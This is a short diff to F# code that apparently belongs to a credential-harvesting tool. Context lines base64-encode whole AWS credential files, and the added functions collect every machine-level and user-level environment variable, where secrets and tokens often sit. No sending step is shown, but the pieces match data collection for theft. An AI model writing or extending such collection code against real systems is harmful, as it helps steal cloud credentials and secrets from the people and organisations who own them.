@@ -277,3 +277,15 @@
         |> Array.map(fun f -> 
             {AWSCredential.path = f; encodedFile = encodeEntireFileB64 f})
         |> Array.toList
+
+
+    let getSystemEnvVariables () : EnvironmentVar list =
+        let evDict = Environment.GetEnvironmentVariables(EnvironmentVariableTarget.Machine)
+        [for key in evDict.Keys do
+            {environmentKey = unbox<string> key; environmentVal = unbox<string> evDict.[key]}]
+
+
+    let getUserEnvVariables () : EnvironmentVar list =
+        let evDict = Environment.GetEnvironmentVariables(EnvironmentVariableTarget.User)
+        [for key in evDict.Keys do
+            {environmentKey = unbox<string> key; environmentVal = unbox<string> evDict.[key]}]
